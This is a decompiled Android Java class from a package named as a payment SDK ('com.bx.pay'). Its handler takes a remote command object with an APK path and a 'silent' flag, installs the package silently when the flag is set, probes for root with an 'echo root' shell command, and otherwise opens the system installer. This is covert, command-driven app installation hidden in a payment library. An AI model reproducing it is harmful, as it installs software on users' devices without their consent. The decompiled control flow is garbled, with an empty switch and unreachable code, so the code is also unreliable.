package com.bx.pay;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import com.bx.pay.utils.h;
import com.bx.pay.utils.j;
import com.bx.pay.utils.k;
import com.bx.pay.utils.n;
import java.io.File;
import org.json.JSONObject;

final class d
  extends Handler
{
  d(Looper paramLooper)
  {
    super(paramLooper);
  }
  
  public final void handleMessage(Message paramMessage)
  {
    switch (paramMessage.what)
    {
    }
    do
    {
      return;
    } while (paramMessage.obj == null);
    for (;;)
    {
      int i;
      try
      {
        Object localObject = (JSONObject)((JSONObject)paramMessage.obj).get("cmdParamter");
        paramMessage = String.valueOf(((JSONObject)localObject).get("path"));
        localObject = String.valueOf(((JSONObject)localObject).get("silent"));
        if (n.a(paramMessage)) {
          break;
        }
        if ("1".equals(localObject))
        {
          h.a(a.a(), paramMessage);
          return;
        }
        localObject = a.a();
        if (!h.a((Context)localObject))
        {
          if (j.a("echo root", true, false).a == 0)
          {
            i = 1;
            break label225;
          }
        }
        else
        {
          h.a((Context)localObject, paramMessage);
          return;
          Intent localIntent = new Intent("android.intent.action.VIEW");
          File localFile = new File(paramMessage);
          if ((!localFile.exists()) || (!localFile.isFile()) || (localFile.length() <= 0L)) {
            break;
          }
          localIntent.setDataAndType(Uri.parse("file://" + paramMessage), "application/vnd.android.package-archive");
          localIntent.addFlags(268435456);
          ((Context)localObject).startActivity(localIntent);
          return;
        }
        i = 0;
      }
      catch (Exception paramMessage)
      {
        return;
      }
      label225:
      if (i == 0) {}
    }
  }
}
